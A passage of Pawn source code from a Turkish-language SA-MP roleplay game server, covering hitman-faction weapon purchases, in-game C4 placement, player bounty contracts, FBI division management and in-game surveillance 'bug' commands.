					SendClientMessage(playerid, COLOR_GREY,"   Bu paket için yeterli paran yok!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"SDPistol",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu silah için yeterli rütben yok!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 100)
				{
					GivePlayerValidWeapon(playerid, 23, 99999);
					GivePlayerCash(playerid, -100);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   Bir silenced pistol satýn aldýn!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   Bu paket için yeterli paran yok!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"Shotgun",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu silah için yeterli rütben yok!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 150)
				{
					GivePlayerValidWeapon(playerid, 25, 99999);
					GivePlayerCash(playerid, -150);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   Bir shotgun satýn aldýn!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   Bu paket için yeterli paran yok!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"Deagle",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu silah için yeterli rütben yok!");
					return 1;
				}
				if(GetPlayerCash(playerid) > 500)
				{
					GivePlayerValidWeapon(playerid, 24, 99999);
					GivePlayerCash(playerid, -500);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   Bir Desert Eagle satýn aldýn!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   Bu paket için yeterli paran yok!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"MP5",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu silah için yeterli rütben yok!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 250)
				{
					GivePlayerValidWeapon(playerid, 29, 99999);
					GivePlayerCash(playerid, -250);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   Bir MP5 satýn aldýn!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   Bu paket için yeterli paran yok!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"Rifle",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 2)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu silah için yeterli rütben yok!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 300)
				{
					GivePlayerValidWeapon(playerid, 33, 99999);
					GivePlayerCash(playerid, -300);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   Bir rifle satýn aldýn!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   Bu paket için yeterli paran yok!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"AK47",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 2)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu silah için yeterli rütben yok(2+) !");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 1000)
				{
					GivePlayerValidWeapon(playerid, 30, 99999);
					GivePlayerCash(playerid, -1000);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   Bir AK-47 satýn aldýn!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   Bu paket için yeterli paran yok!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"M4",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 2)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu silah için yeterli rütben yok(2+) !");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 1200)
				{
					GivePlayerValidWeapon(playerid, 31, 99999);
					GivePlayerCash(playerid, -1200);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   Bir M4 satýn aldýn!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   Bu paket için yeterli paran yok!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"Vest",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 1)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu silah için yeterli rütben yok!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 600)
				{
					SetPlayerArmourEx(playerid, 100);
					GivePlayerCash(playerid, -600);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   Bir kevlar vest satýn aldýn!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   Bu paket için yeterli paran yok!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"Spas12",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 3)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu silah için yeterli rütben yok(3+) !");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 3500)
				{
					GivePlayerValidWeapon(playerid, 27, 99999);
					GivePlayerCash(playerid, -3500);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   Bir SPAS-12 satýn aldýn!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   Bu paket için yeterli paran yok!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"Sniper",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 3)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu silah için yeterli rütben yok (3+)!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 3500)
				{
					GivePlayerValidWeapon(playerid, 34, 99999);
					GivePlayerCash(playerid, -3500);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   Bir sniper rifle satýn aldýn!");
					return 1;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   Bu paket için yeterli paran yok!");
					return 1;
				}
			}
			else if(strcmp(Hitman,"C4",true) == 0)
			{
				if(PlayerInfo[playerid][pRank] < 4)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu silah için yeterli rütben yok(4+)!");
					return 1;
				}
				if(GetPlayerCash(playerid) >= 5000)
				{
					PlayerInfo[playerid][pC4Get] = 1;
					PlayerInfo[playerid][pBombs]++;
					GivePlayerCash(playerid, -5000);
					SendClientMessage(playerid, COLOR_LIGHTBLUE,"   Bir blok C4 satýn aldýn!");
				}
				else
				{
					SendClientMessage(playerid, COLOR_GREY,"   Bu paket için yeterli paran yok!");
					return 1;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, "Silah kulübesinde deðilsin!");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Hitman Ajansý üyesi deðilsin!");
		return 1;
	}
	return 1;
}

CMD:rutbeler(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] != 4 && PlayerInfo[playerid][pLeader] != 4 && PlayerInfo[playerid][pAdmin] != 6 && PlayerInfo[playerid][pAdmin] < 3 || PlayerInfo[playerid][pAdmin] >= 3 && AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] != 6 && PlayerInfo[playerid][pFaction] != 4 && PlayerInfo[playerid][pLeader] != 4)
		return SendClientMessage(playerid, COLOR_GREY, "Hitman Ajansý üyesi deðilsin!");

	SendClientMessage(playerid, COLOR_WHITE, "|__________________ Hitman Rank'larý __________________|");

	new string[128];
	foreach(Player, i)
	{
		if(PlayerInfo[i][pFaction] == 4 || PlayerInfo[i][pLeader] == 4)
		{
			if(GoChase[playerid] == 999)
			{
				format(string, sizeof(string), "* Ýsim: %s | Rank %d | Baþarýlý Kontraktlar: %d | Baþarýsýz Kontraktlar: %d", GetPlayerNameEx(i),PlayerInfo[i][pRank], PlayerInfo[i][pCHits], PlayerInfo[i][pFHits]);
				SendClientMessage(playerid, COLOR_GREY, string);
			}
			else
			{
				format(string, sizeof(string), "* Ýsim: %s | Rank %d | Baþarýlý Kontraktlar: %d | Baþarýsýz Kontraktlar: %d | Takip: %s", GetPlayerNameEx(i),PlayerInfo[i][pRank], PlayerInfo[i][pCHits], PlayerInfo[i][pFHits], GetPlayerNameEx(GoChase[i]));
				SendClientMessage(playerid, COLOR_GREY, string);
			}
		}
	}
	return 1;
}

CMD:profil(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
	{
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /profil [Oyuncu ID/Ýsim]");

		if(IsPlayerConnected(giveplayerid))
		{
			new ftext[24];
			if(PlayerInfo[giveplayerid][pFaction] == 1 || PlayerInfo[giveplayerid][pLeader] == 1)
			{ ftext = "LSPD"; }
			else if(PlayerInfo[giveplayerid][pFaction] == 2 || PlayerInfo[giveplayerid][pLeader] == 2)
			{ ftext = "FBI"; }
			else if(PlayerInfo[giveplayerid][pFaction] == 3 || PlayerInfo[giveplayerid][pLeader] == 3)
			{ ftext = "LSFMD"; }
			else if(PlayerInfo[giveplayerid][pFaction] == 4 || PlayerInfo[giveplayerid][pLeader] == 4)
			{ ftext = "Hitman Ajansý"; }
			else if(PlayerInfo[giveplayerid][pFaction] == 6 || PlayerInfo[giveplayerid][pLeader] == 6)
			{ ftext = "LST"; }
			else
			{ ftext = "Yok"; }
			new f2text[64];
			if(PlayerInfo[giveplayerid][pGang] < 255)
			{
				format(f2text, sizeof(f2text), "%s", FamilyInfo[PlayerInfo[giveplayerid][pGang]][FamilyName]);
			}
			else { f2text = "Yok"; }
			SendClientMessage(playerid, COLOR_WHITE, "Profil Bilgilendirmesi:");
			format(string, sizeof(string), "Ýsim: %s", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_GRAD2, string);
			format(string, sizeof(string), "Yaþ: %d", PlayerInfo[giveplayerid][pAge]);
			SendClientMessage(playerid, COLOR_GRAD2, string);
			format(string, sizeof(string), "Organizasyon: %s", ftext);
			SendClientMessage(playerid, COLOR_GRAD2, string);
			format(string, sizeof(string), "Aile: %s", f2text);
			SendClientMessage(playerid, COLOR_GRAD2, string);
			format(string, sizeof(string), "Ödül: $%d", PlayerInfo[giveplayerid][pHeadValue]);
			SendClientMessage(playerid, COLOR_GRAD2, string);
		}
	}
	return 1;
}

CMD:hrozet(playerid, params[]) {
	if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4) {
		if(isnull(params)) {
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /hrozet [faction]");
			SendClientMessage(playerid, COLOR_GRAD3, "|0 Normal |1 LSPD |2 FBI |3 LSFMD ");
		}
		else switch(strval(params)) {
			case 0: {
		        SendClientMessage(playerid, COLOR_WHITE, "Rozetini normale döndürdün.");
		        SetPlayerColor(playerid,TEAM_HIT_COLOR);
			}
			case 1: {
			    SendClientMessage(playerid, COLOR_WHITE, "Rozetini LSPD olarak ayarladýn.");
			    SetPlayerColor(playerid,TEAM_BLUE_COLOR);
			}
			case 2: {
			    SendClientMessage(playerid, COLOR_WHITE, "Rozetini FBI olarak ayarladýn.");
			    SetPlayerColor(playerid,TEAM_FBI_COLOR);
			}
			case 3: {
			    SendClientMessage(playerid, COLOR_WHITE, "Rozetini LSFMD olarak ayarladýn.");
			    SetPlayerColor(playerid, TEAM_MED_COLOR);
			}
			default: SendClientMessage(playerid, COLOR_GREY, "Yanlýþ Faction.");
		}
	}
	return 1;
}

CMD:bombakoy(playerid, params[]) {
	return cmd_bk(playerid, params);
}

CMD:bk(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
	{
		if(PlayerInfo[playerid][pC4] == 0)
		{
			if(PlayerInfo[playerid][pBombs] != 0)
			{
				if(IsPlayerInAnyVehicle(playerid))
				{
					SendClientMessage(playerid, COLOR_LIGHTRED,"Araç içindeyken bomba yerleþtiremezsin!");
					return 1;
				}
				GetPlayerPos(playerid,Positions[0][0], Positions[0][1], Positions[0][2]);
				SetPVarFloat(playerid, "DYN_C4_FLOAT_X", Positions[0][0]);
				SetPVarFloat(playerid, "DYN_C4_FLOAT_Y", Positions[0][1]);
				SetPVarFloat(playerid, "DYN_C4_FLOAT_Z", Positions[0][2]);
				PlayerInfo[playerid][pC4] = CreateDynamicObject(1654, Positions[0][0], Positions[0][1], Positions[0][2]-0.9, 0, 89.325012207031, 3.9700012207031);
				ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
				ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
				SendClientMessage(playerid, COLOR_GREEN, "Bir C4 yerleþtirdin, /bombayial komutuyla deaktif hale getirebilirsin.");
				//PlayerInfo[playerid][pC4] = 1;
				PlayerInfo[playerid][pBombs]--;
				PlayerInfo[playerid][pC4Used] = 1;
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "C4'ün yok!");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, " Ayný anda 1 den fazla C4 yerleþtiremezsin ! ");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Hitman Deðilsin");
	}
	return 1;
}

CMD:aracabombakoy(playerid, params[]) {
	return cmd_abk(playerid, params);
}

CMD:abk(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
	{
		if(PlayerInfo[playerid][pC4] == 0)
		{
			if(PlayerInfo[playerid][pBombs] != 0)
			{
				new carid = GetPlayerVehicleID(playerid);
				new closestcar = GetClosestCar(playerid, carid);
				if(IsPlayerInRangeOfVehicle(playerid, closestcar, 4.0))
				{
					if(VehicleBomb{closestcar} == 1)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "Bu aracýn motorunda zaten bir bomba var!");
						return 1;
					}
					VehicleBomb{closestcar} = 1;
					PlacedVehicleBomb[playerid] = closestcar;
					ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
					ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.0,0,0,0,0,0);
					SendClientMessage(playerid, COLOR_GREEN, "Araç motoruna bir bomba yerleþtirdin, /bombayial komutuyla deaktif hale getirebilirsin.");
					PlayerInfo[playerid][pC4] = 1;
					PlayerInfo[playerid][pBombs]--;
					PlayerInfo[playerid][pC4Used] = 2;
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD2, "Araca daha fazla yakýnlaþmalýsýn!");
					return 1;
				}
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD2, "C4'ün yok!");
				return 1;
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD2, " Ayný anda 1'den fazla C4 koyamazsýn. ! ");
			return 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Hitman deðilsin ! ");
	}
	return 1;
}

CMD:bombayial(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] != 4 && PlayerInfo[playerid][pLeader] != 4)
	{
		SendClientMessage(playerid, COLOR_GREY, "Hitman deðilsin!");
		return 1;
	}
	if(PlayerInfo[playerid][pC4] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Bomba yerleþtirmedin!");
		return 1;
	}
	new carid = GetPlayerVehicleID(playerid);
	new closestcar = GetClosestCar(playerid, carid);
	if(IsPlayerInRangeOfVehicle(playerid, closestcar, 4.0) && VehicleBomb{closestcar} == 1)
	{
		VehicleBomb{closestcar} = 0;
		PlacedVehicleBomb[playerid] = INVALID_VEHICLE_ID;
		PickUpC4(playerid);
		SendClientMessage(playerid, COLOR_GREEN, "Bomba baþarýyla alýndý.");
		PlayerInfo[playerid][pBombs]++;
		PlayerInfo[playerid][pC4Used] = 0;
		PlayerInfo[playerid][pC4Get] = 1;
		return 1;
	}
	if(IsPlayerInRangeOfPoint(playerid, 3.0, GetPVarFloat(playerid, "DYN_C4_FLOAT_X"), GetPVarFloat(playerid, "DYN_C4_FLOAT_Y"), GetPVarFloat(playerid, "DYN_C4_FLOAT_Z")))
	{
		PickUpC4(playerid);
		SendClientMessage(playerid, COLOR_GREEN, "Bomba baþarýyla alýndý.");
		PlayerInfo[playerid][pBombs]++;
		PlayerInfo[playerid][pC4Used] = 0;
		PlayerInfo[playerid][pC4Get] = 1;
		return 1;
	}
	return 1;
}

CMD:mekanigoster(playerid, params[])
{
    if(CheckPointCheck(playerid)) {
        SendClientMessage(playerid, COLOR_WHITE, "Þu anki checkpoint'inizin iptal edildiðinden emin olun (Materyal paketleriniz veya mevcut checkpoint'iniz olabilir).");
        return 1;
    }
    if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4) {
        SetPlayerCheckpoint(playerid,1938.545898, 165.629531, 37.281250, 4.0);
        GameTextForPlayer(playerid, "~w~GPS: ~r~HQ", 5000, 1);
        gPlayerCheckpointStatus[playerid] = CHECKPOINT_HITMAN;
    }
    return 1;
}

CMD:deletehit(playerid, params[])
{
	//if((PlayerInfo[playerid][pAdmin] >= 4 && AdminDuty[playerid] == 1) || (PlayerInfo[playerid][pFaction] == 4 && PlayerInfo[playerid][pRank] >= 5) || PlayerInfo[playerid][pLeader] == 4)
    if(PlayerInfo[playerid][pAdmin] >= 4 && AdminDuty[playerid] == 1)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }
		new string[128], giveplayerid;
		if(sscanf(params, "u", giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /deletehit [Oyuncu ID/Ýsim]");

		if(!IsPlayerConnected(giveplayerid))
		{
			SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
			return 1;
		}

		if(PlayerInfo[giveplayerid][pHeadValue] >= 1)
		{
			format(string, sizeof(string), "%s adlý kiþi %s adlý kiþi üzerindeki kontrakt'ý sildi. (%d$)", GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), PlayerInfo[giveplayerid][pHeadValue]);
			Log("logs/kontraktlar.log", string);
			PlayerInfo[giveplayerid][pHeadValue] = 0;
			format(string, sizeof(string), "%s adlý kiþinin üzerindeki kontrakt'ý sildin.", GetPlayerNameEx(giveplayerid));
			SendClientMessage(playerid, COLOR_WHITE, string);
			GoChase[giveplayerid] = 999;

			foreach(Player, i)
			{
				if(HitToGet[i] == giveplayerid)
				{
					HitToGet[i] = 999;
					HitOffer[i] = 999;
				}
			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "Bu kiþi üzerinde aktif bir kontrakt yok!");
		}
	}
	return 1;
}

CMD:kontrakt(playerid, params[])
{
	if(PlayerCuffed[playerid] != 0) return SendClientMessage(playerid, COLOR_GREY, "Kelepçeliyken kontrakt yapamazsýn.");
	if(PlayerInfo[playerid][pJailTime] > 0) return SendClientMessage(playerid, COLOR_GREY, "Hapisteyken kontrakt imzalayamazsýn.");

	new string[128], giveplayerid, moneys, detail[32];
	if(sscanf(params, "uds[32]", giveplayerid, moneys, detail)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /kontrakt [Oyuncu ID/Ýsim] [fiyat] [detaylar]");

	if(moneys < 5000 || moneys > 50000)
	{
		SendClientMessage(playerid, COLOR_GREY, "Fiyat 5,000$ - 50,000$ arasýnda olmalýdýr.");
		return 1;
	}
	else if((moneys < 10000 || moneys > 50000) && IsACop(giveplayerid))
	{
		SendClientMessage(playerid, COLOR_GREY, "Devlet Memurlarý için Fiyat 10,000$ - 50,000$ arasýnda olmalýdýr.");
		return 1;
	}
	if(PlayerInfo[playerid][pLevel] < 2)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Kontrakt yapmak için en az 2 level olman gerekir.");
		return 1;
	}
	if(PlayerInfo[giveplayerid][pConnectTime] < 12)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "12 saatten az oyunda olan birisine kontrakt yapamazsýn.");
		return 1;
	}
	if(AdminDuty[giveplayerid] == 1)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Görev baþýndaki admine kontrakt imzalayamazsýn.");
		return 1;
	}
	if(IsPlayerConnected(giveplayerid))
	{
		if(PlayerInfo[playerid][pFaction] == 4 || PlayerInfo[playerid][pLeader] == 4)
		{
			SendClientMessage(playerid, COLOR_GREY, "Bu kiþiye kontrakt imzalayamazsýn.");
		}
		else
		{
			if(giveplayerid != INVALID_PLAYER_ID)
			{
				if(moneys >= 50001)
				{
					SendClientMessage(playerid, COLOR_GREY, "50,000$ dan fazla fiyat belirleyemezsin!");
					return 1;
				}

				if(PlayerInfo[giveplayerid][pHeadValue] >= 50000)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu kiþinin üzerinde yeterince kontrakt var.(Max. 50.000$)");
					return 1;
				}
				if(moneys + PlayerInfo[giveplayerid][pHeadValue] >= 50001)
				{
					SendClientMessage(playerid, COLOR_GREY, "Bu kiþinin üzerinde yeterince kontrakt var.(Max. 50.000$)");
					return 1;
				}

				if(giveplayerid == playerid) { SendClientMessage(playerid, COLOR_GREY, "Kendin için kontrakt imzalayamazsýn."); return 1; }
				new playermoney = GetPlayerCash(playerid);
				if(moneys > 0 && playermoney >= moneys)
				{
					if(strlen(detail) > 32) return SendClientMessage(playerid, COLOR_GRAD1, "Kontrakt detaylarý 32 karakterden fazla olamaz.");
					GivePlayerCash(playerid, (0 - moneys));
					PlayerInfo[giveplayerid][pHeadValue]+=moneys;
					strmid(PlayerInfo[giveplayerid][pContractBy], GetPlayerNameEx(playerid), 0, strlen(GetPlayerNameEx(playerid)), MAX_PLAYER_NAME);
					strmid(PlayerInfo[giveplayerid][pContractDetail], detail, 0, strlen(detail), 32);

					format(string, sizeof(string), "%s adlý kiþi %s adlý kiþi için kontrakt imzaladý. Fiyat: %d$, detaylar: %s.",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), moneys, detail);
					SendFamilyMessage(4, COLOR_YELLOW, string);

					format(string, sizeof(string), "* %s adlý kiþi için bir kontrakt imzaladýn.Fiyat %d$, detaylar: %s.",GetPlayerNameEx(giveplayerid), moneys, detail);
					SendClientMessage(playerid, COLOR_LIGHTBLUE, string);

					format(string, sizeof(string), "%s adli kisi %s for $%d, details: %s",GetPlayerNameEx(playerid),GetPlayerNameEx(giveplayerid),moneys,detail);
					Log("logs/contracts.log", string);

					format(string, sizeof(string), "%s adlý kiþi %s adlý kiþiye bir kontrakt t/yap Beni engelleyen herhangi bir durum var mý ?. Fiyat: %d$, detaylar: %s.",GetPlayerNameEx(playerid), GetPlayerNameEx(giveplayerid), moneys, detail);
					ABroadCast(COLOR_YELLOW,string,4);

					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				}
				else
				{
					SendClientMessage(playerid, COLOR_GRAD1, "Bunun için yeterli paran yok.");
				}
			}
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	return 1;
}

CMD:fbi(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
	{
		if(AdminDuty[playerid] == 1)
			return SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");

		if(IsPlayerInRangeOfPoint(playerid,3,310.3679,-1537.5204,-45.1338) || GetPlayerVirtualWorld(playerid) == 444 || IsPlayerInRangeOfPoint(playerid,3.5,255.385696, 77.201263, 1003.640625))
		{
			ShowPlayerDialogEx(playerid, FDUTYMENU, DIALOG_STYLE_LIST, "FBI Menu","Is Basi\nEkipman\nSWAT Uniforma\nUniforma\nGizli Gorev\nSuc Temizle", "Seç", "Iptal");
		}
		else
		{
			SendClientMessage(playerid, COLOR_WHITE, "FBI dolabýna yakýn deðilsin.");
		}
	}
	return 1;
}

CMD:fbibirim(playerid, params[])
{
	if(IsACop(playerid))
	{
		new string[128], giveplayerid, division;
		if(sscanf(params, "ud", giveplayerid, division))
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /fbibirim [Oyuncu ID/Ýsim] [division]");
			SendClientMessage(playerid, COLOR_GRAD2, "Available division names: 1 (Yok), 2 (ÇB), 3 (ASVN), 4 (CID), 5 (IA)");
			return 1;
		}
		if(PlayerInfo[playerid][pFaction] == 2 && PlayerInfo[playerid][pRank] >= 4)
		{
			if(IsPlayerConnected(giveplayerid))
			{
				if(PlayerInfo[playerid][pFaction] == 2 || PlayerInfo[playerid][pLeader] == 2)
				{
					if(division == 3)
					{
						if(PlayerInfo[giveplayerid][pFaction] == 2)
						{
							PlayerInfo[giveplayerid][pDivision] = 3;
							format(string, sizeof(string), "%s adlý kiþi tarafýndan ASVN birimine alýndýn.", GetPlayerNameEx(playerid));
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "%s adlý kiþiyi ASVN birimine davet ettin.", GetPlayerNameEx(giveplayerid));
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						}
					}
					else if(division == 5)
					{
						if(PlayerInfo[giveplayerid][pFaction] == 2)
						{
							PlayerInfo[giveplayerid][pDivision] = 5;
							format(string, sizeof(string), "%s adlý kiþi tarafýndan IA birimine alýndýn.", GetPlayerNameEx(playerid));
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "%s adlý kiþiyi IA birimine davet ettin.", GetPlayerNameEx(giveplayerid));
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						}
					}
					else if(division == 4)
					{
						if(PlayerInfo[giveplayerid][pFaction] == 2)
						{
							PlayerInfo[giveplayerid][pDivision] = 4;
							format(string, sizeof(string), "%s adlý kiþi tarafýndan CID birimine alýndýn.", GetPlayerNameEx(playerid));
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "%s adlý kiþiyi CID birimine davet ettin.", GetPlayerNameEx(giveplayerid));
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						}
					}
					else if(division == 2)
					{
						if(PlayerInfo[giveplayerid][pFaction] == 2)
						{
							PlayerInfo[giveplayerid][pDivision] = 2;
							format(string, sizeof(string), "%s adlý kiþi tarafýndan ÇB birimine alýndýn.", GetPlayerNameEx(playerid));
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "%s adlý kiþiyi ÇB birimine davet ettin.", GetPlayerNameEx(giveplayerid));
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						}
					}
					else if(division == 1)
					{
						if(PlayerInfo[giveplayerid][pFaction] == 2)
						{
							PlayerInfo[giveplayerid][pDivision] = 1;
							format(string, sizeof(string), "%s adlý kiþi tarafýndan biriminden kovuldun.", GetPlayerNameEx(playerid));
							SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);
							format(string, sizeof(string), "%s adlý kiþiyi biriminden kovdun.", GetPlayerNameEx(giveplayerid));
							SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
						}
					}
				}

			}
		}
		else
		{
			SendClientMessage(playerid, COLOR_GRAD1, "Bu komutu kullanabilmek için yetkin yok - Sadece R4+ kiþiler bu komutu kullanabilir");
		}
	}
	return 1;
}

CMD:bocek(playerid, params[]) {
    if(PlayerInfo[playerid][pFaction] == 2) {

        new
			iTargetID;

        if(sscanf(params, "u", iTargetID)) {
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /bocek [Oyuncu ID/Ýsim]");
		}
        else if(AdminDuty[iTargetID] == 1) {
			SendClientMessage(playerid, COLOR_GREY, "Adminlerin üzerine böcek koyamazsýn.");
		}
  		else if(PlayerInfo[iTargetID][pBugged] == 1) {

			new
				szMessage[32 + MAX_PLAYER_NAME];

    		PlayerInfo[iTargetID][pBugged] = 0;
     		format(szMessage,sizeof(szMessage)," %s adlý kiþi üzerindeki böcek deaktif edildi.", GetPlayerNameEx(iTargetID));
       		SendClientMessage(playerid, COLOR_GRAD1, szMessage);
		}
		else if(ProxDetectorS(4.0, playerid, iTargetID)) {

			new
				szMessage[28 + MAX_PLAYER_NAME];

   			PlayerInfo[iTargetID][pBugged] = 1;
	    	format(szMessage,sizeof(szMessage),"%s adlý kiþinin üstüne bir böcek koydun.",GetPlayerNameEx(iTargetID));
		    SendClientMessage(playerid, COLOR_GRAD1, szMessage);
		}
		else SendClientMessage(playerid, COLOR_GRAD1, "Bu kiþiye daha fazla yaklaþmalýsýn.");
	}
	return 1;
}

CMD:bocekkanalikapat(playerid, params[])
{
	if(PlayerInfo[playerid][pFaction] == 2) {
		if(gBug[playerid] == 0)
		{
			gBug[playerid] = 1;
			SendClientMessage(playerid, COLOR_GRAD2, "Böcek kanalý aktif edildi.Böceklerden gelen her sesi duyacaksýn.");
		}
		else
		{
			gBug[playerid] = 0;
			SendClientMessage(playerid, COLOR_GRAD2, "Böcek kanalý kapatýldý.");
		}
	}
	return 1;
}

CMD:aracibagla(playerid, params[]) {
	switch(PlayerInfo[playerid][pFaction]) {
		case 1, 2: {
			if(!IsAtImpoundingPoint(playerid))
			{
				SendClientMessage(playerid, COLOR_GREY, "Aracý baðlayabileceðin yerde deðilsin!");
				return 1;
			}
			if(IsTrailerAttachedToVehicle(GetPlayerVehicleID(playerid)))
			{

				new
					iVehType,
					iVehIndex,
					iTargetOwner,
					iVehTowed = GetVehicleTrailer(GetPlayerVehicleID(playerid));

				if(!GetVehicleModel(iVehTowed)) {
					return SendClientMessage(playerid, COLOR_GREY, "Çekiyor olduðun araç ekran buguna düþtüðünden dolayý baðlanamýyor.");
				}
				foreach(Player, i) {
